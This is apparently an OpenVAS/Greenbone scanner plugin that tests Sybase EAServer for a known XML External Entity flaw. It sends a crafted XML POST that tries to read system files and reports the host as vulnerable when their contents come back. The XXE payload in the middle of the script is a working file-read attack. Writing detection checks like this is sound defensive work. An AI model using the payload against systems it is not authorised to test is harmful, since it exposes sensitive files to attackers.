if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103752" );
	script_bugtraq_id( 61358 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Sybase EAServer Multiple Security Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/61358" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-08-08 13:44:48 +0200 (Thu, 08 Aug 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Jetty_EAServer/banner" );
	script_tag( name: "impact", value: "Successful exploits will allow attackers to download and upload
  arbitrary files on the affected computer, obtain potentially sensitive
  information and execute arbitrary commands with the privileges of the
  user running the affected application." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP XML POST request and check the response." );
	script_tag( name: "insight", value: "1. A directory-traversal vulnerability

  2. An XML External Entity injection

  3. A command execution vulnerability" );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Sybase EAServer is prone to multiple security vulnerabilities." );
	script_tag( name: "affected", value: "Sybase EAServer 6.3.1 and prior are vulnerable." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: Jetty(EAServer/" )){
	exit( 0 );
}
url = "/rest/public/xml-1.0/testDataTypes";
files = traversal_files();
host = http_host_name( port: port );
for file in keys( files ) {
	xml = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [
     <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM \"file:///" + files[file] + "\">]>
  <vttest>
  <dt>
  <stringValue>&xxe;</stringValue>
  <booleanValue>0</booleanValue>
  </dt>
  </vtttest>";
	len = strlen( xml );
	req = "POST " + url + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "Content-Type: text/xml\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + xml;
	result = http_send_recv( port: port, data: req, bodyonly: TRUE );
	if(!ContainsString( result, "<testDataTypesResponse>" )){
		continue;
	}
	cont = split( buffer: result, sep: "<stringValue>", keep: FALSE );
	if(isnull( cont[1] )){
		continue;
	}
	if(ereg( pattern: file, string: cont[1] )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

